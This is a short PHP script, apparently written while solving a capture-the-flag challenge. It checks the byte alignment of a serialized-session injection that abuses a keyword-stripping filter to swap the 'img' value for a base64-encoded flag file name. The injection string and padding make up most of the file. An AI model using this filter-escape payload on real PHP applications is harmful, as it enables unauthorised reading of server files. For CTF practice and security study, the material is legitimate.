<?php
// Let me check the exact positions

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$injection = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = 'phpphpflag' . $injection;
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
$filtered = filter($serialized);

// Content starts at position 49
$content_start = 49;

// Print positions 49-110
echo "Positions 49-110:\n";
for ($i = 49; $i <= 110; $i++) {
    $relative = $i - 49;
    echo "Position $relative (absolute $i): '" . $filtered[$i] . "'\n";
}

// The 51 bytes of content
echo "\n51 bytes of content (positions 0-50):\n";
for ($i = 0; $i <= 50; $i++) {
    echo "Position $i: '" . $filtered[$content_start + $i] . "'\n";
}

// Position 51 (the next char)
echo "\nPosition 51 (next char after 51 bytes): '" . $filtered[$content_start + 51] . "'\n";
echo "Position 52: '" . $filtered[$content_start + 52] . "'\n";
echo "Position 53: '" . $filtered[$content_start + 53] . "'\n";

